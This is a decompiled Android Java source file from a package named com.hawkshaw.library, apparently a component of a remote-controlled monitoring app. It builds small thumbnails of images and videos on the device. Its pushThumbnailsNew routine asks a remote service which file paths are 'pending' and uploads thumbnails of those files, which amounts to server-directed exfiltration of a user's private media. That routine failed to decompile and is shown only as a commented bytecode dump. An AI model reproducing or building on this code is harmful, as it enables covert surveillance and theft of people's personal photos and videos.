package com.hawkshaw.library.features.media.filecrud;

import O1.u;
import O1.v;
import X1.B;
import Y1.K;
import a3.e;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.media.ExifInterface;
import android.media.MediaMetadataRetriever;
import android.media.ThumbnailUtils;
import android.net.Uri;
import com.hawkshaw.library.App;
import com.hawkshaw.library.logger.Logger;
import i.C0528x;
import java.io.ByteArrayOutputStream;
import java.io.File;
import java.util.List;
import t3.N;

public final class ThumbnailsUtilsNewKt {
    private static final String TAG = "ThumbnailsUtilsNew";

    /* access modifiers changed from: private */
    public static final Object getFiles(List<String> list, e eVar) {
        return B.B(N.f9292c, new u(list, (e) null), eVar);
    }

    /* access modifiers changed from: private */
    public static final byte[] getImageThumbnail(File file, ByteArrayOutputStream byteArrayOutputStream) {
        ExifInterface exifInterface;
        Bitmap bitmap;
        try {
            exifInterface = new ExifInterface(file.getPath());
        } catch (Exception unused) {
            exifInterface = null;
        }
        if (exifInterface == null || !exifInterface.hasThumbnail()) {
            try {
                bitmap = ThumbnailUtils.extractThumbnail(BitmapFactory.decodeFile(file.getPath()), 128, 128);
            } catch (Exception e5) {
                Logger.v$default(Logger.INSTANCE, TAG, C0528x.e("Image: ", file.getPath(), ", ", e5.getMessage()), false, 4, (Object) null);
                bitmap = null;
            }
        } else {
            bitmap = exifInterface.getThumbnailBitmap();
        }
        if (bitmap != null) {
            return toByteArray(bitmap, byteArrayOutputStream);
        }
        return null;
    }

    /* access modifiers changed from: private */
    public static final Object getThumbnail(File file, ByteArrayOutputStream byteArrayOutputStream, e eVar) {
        return B.B(N.f9292c, new v(file, byteArrayOutputStream, (e) null), eVar);
    }

    /* access modifiers changed from: private */
    public static final byte[] getVideoThumbnail(File file, ByteArrayOutputStream byteArrayOutputStream) {
        Bitmap bitmap;
        MediaMetadataRetriever mediaMetadataRetriever = new MediaMetadataRetriever();
        try {
            mediaMetadataRetriever.setDataSource(App.Companion.getContext(), Uri.parse(file.getPath()));
            Bitmap frameAtTime = mediaMetadataRetriever.getFrameAtTime(1000, 2);
            if (frameAtTime != null) {
                bitmap = Bitmap.createScaledBitmap(frameAtTime, 128, 128, false);
                mediaMetadataRetriever.release();
                if (bitmap != null) {
                    return toByteArray(bitmap, byteArrayOutputStream);
                }
                return null;
            }
            throw new Exception();
        } catch (Exception e5) {
            Logger.v$default(Logger.INSTANCE, TAG, "Video MMR: " + file.getPath() + ", " + e5.getMessage(), false, 4, (Object) null);
            try {
                bitmap = ThumbnailUtils.createVideoThumbnail(file.getPath(), 1);
            } catch (Exception e6) {
                Logger.v$default(Logger.INSTANCE, TAG, "Video TU: " + file.getPath() + ", " + e6.getMessage(), false, 4, (Object) null);
                bitmap = null;
            }
        } catch (Throwable th) {
            mediaMetadataRetriever.release();
            throw th;
        }
    }

    /* JADX WARNING: type inference failed for: r10v12, types: [java.lang.Object, j3.q] */
    /* JADX WARNING: type inference failed for: r0v3, types: [c3.c] */
    /* JADX WARNING: Multi-variable type inference failed */
    /* JADX WARNING: Removed duplicated region for block: B:16:0x004d  */
    /* JADX WARNING: Removed duplicated region for block: B:22:0x007a  */
    /* JADX WARNING: Removed duplicated region for block: B:28:0x00be A[RETURN] */
    /* JADX WARNING: Removed duplicated region for block: B:29:0x00bf A[RETURN] */
    /* JADX WARNING: Removed duplicated region for block: B:8:0x0026  */
    /* Code decompiled incorrectly, please refer to instructions dump. */
    public static final java.lang.Object pushThumbnailsNew(a3.e r10) {
        /*
            boolean r0 = r10 instanceof O1.w
            if (r0 == 0) goto L_0x0013
            r0 = r10
            O1.w r0 = (O1.w) r0
            int r1 = r0.f1560G
            r2 = -2147483648(0xffffffff80000000, float:-0.0)
            r3 = r1 & r2
            if (r3 == 0) goto L_0x0013
            int r1 = r1 - r2
            r0.f1560G = r1
            goto L_0x0018
        L_0x0013:
            O1.w r0 = new O1.w
            r0.<init>(r10)
        L_0x0018:
            java.lang.Object r10 = r0.f1559F
            b3.a r1 = b3.C0298a.f4140D
            int r2 = r0.f1560G
            W2.y r3 = W2.y.f2418a
            r4 = 3
            r5 = 2
            r6 = 1
            r7 = 0
            if (r2 == 0) goto L_0x004d
            if (r2 == r6) goto L_0x0043
            if (r2 == r5) goto L_0x0039
            if (r2 != r4) goto L_0x0031
            Y1.C0110h.P(r10)
            goto L_0x00bf
        L_0x0031:
            java.lang.IllegalStateException r10 = new java.lang.IllegalStateException
            java.lang.String r0 = "call to 'resume' before 'invoke' with coroutine"
            r10.<init>(r0)
            throw r10
        L_0x0039:
            java.lang.Object r2 = r0.f1558E
            java.util.List r2 = (java.util.List) r2
            j3.q r5 = r0.f1557D
            Y1.C0110h.P(r10)
            goto L_0x00ab
        L_0x0043:
            java.lang.Object r2 = r0.f1558E
            java.io.ByteArrayOutputStream r2 = (java.io.ByteArrayOutputStream) r2
            j3.q r6 = r0.f1557D
            Y1.C0110h.P(r10)
            goto L_0x0074
        L_0x004d:
            Y1.C0110h.P(r10)
            j3.q r10 = new j3.q
            r10.<init>()
            java.io.ByteArrayOutputStream r2 = new java.io.ByteArrayOutputStream
            r2.<init>()
            com.hawkshaw.library.datalayer.Injector$Companion r8 = com.hawkshaw.library.datalayer.Injector.Companion
            com.hawkshaw.library.datalayer.Injector r8 = r8.getInstance()
            com.hawkshaw.library.datalayer.network.service.MediaService r8 = r8.getMediaService()
            r0.f1557D = r10
            r0.f1558E = r2
            r0.f1560G = r6
            java.lang.Object r6 = r8.getPendingThumbnails(r0)
            if (r6 != r1) goto L_0x0071
            return r1
        L_0x0071:
            r9 = r6
            r6 = r10
            r10 = r9
        L_0x0074:
            com.hawkshaw.library.datalayer.network.twirp.ApiResponse r10 = (com.hawkshaw.library.datalayer.network.twirp.ApiResponse) r10
            boolean r8 = r10 instanceof com.hawkshaw.library.datalayer.network.twirp.ApiResponse.Success
            if (r8 == 0) goto L_0x00bf
            com.hawkshaw.library.datalayer.network.twirp.ApiResponse$Success r10 = (com.hawkshaw.library.datalayer.network.twirp.ApiResponse.Success) r10
            java.lang.Object r10 = r10.getResult()
            com.hawkshaw.library.datalayer.models.GetPendingThumbnailsResponse r10 = (com.hawkshaw.library.datalayer.models.GetPendingThumbnailsResponse) r10
            java.util.List r10 = r10.getPaths()
            O1.z r8 = new O1.z
            r8.<init>(r10, r2, r6, r7)
            w3.e r2 = new w3.e
            r2.<init>((i3.p) r8)
            com.hawkshaw.library.datalayer.Injector$Companion r8 = com.hawkshaw.library.datalayer.Injector.Companion
            com.hawkshaw.library.datalayer.Injector r8 = r8.getInstance()
            com.hawkshaw.library.datalayer.network.service.FileService r8 = r8.getFileService()
            r0.f1557D = r6
            r0.f1558E = r10
            r0.f1560G = r5
            java.lang.Object r2 = r8.uploadThumbnails(r2, r0)
            if (r2 != r1) goto L_0x00a7
            return r1
        L_0x00a7:
            r5 = r6
            r9 = r2
            r2 = r10
            r10 = r9
        L_0x00ab:
            w3.b r10 = (w3.C1066b) r10
            O1.x r6 = new O1.x
            r6.<init>(r5, r2, r7)
            r0.f1557D = r7
            r0.f1558E = r7
            r0.f1560G = r4
            java.lang.Object r10 = v3.j.c(r0, r6, r10)
            if (r10 != r1) goto L_0x00bf
            return r1
        L_0x00bf:
            return r3
        */
        throw new UnsupportedOperationException("Method not decompiled: com.hawkshaw.library.features.media.filecrud.ThumbnailsUtilsNewKt.pushThumbnailsNew(a3.e):java.lang.Object");
    }

    private static final byte[] toByteArray(Bitmap bitmap, ByteArrayOutputStream byteArrayOutputStream) {
        byteArrayOutputStream.reset();
        bitmap.compress(Bitmap.CompressFormat.PNG, 90, byteArrayOutputStream);
        byte[] byteArray = byteArrayOutputStream.toByteArray();
        K.m(byteArray, "toByteArray(...)");
        return byteArray;
    }
}
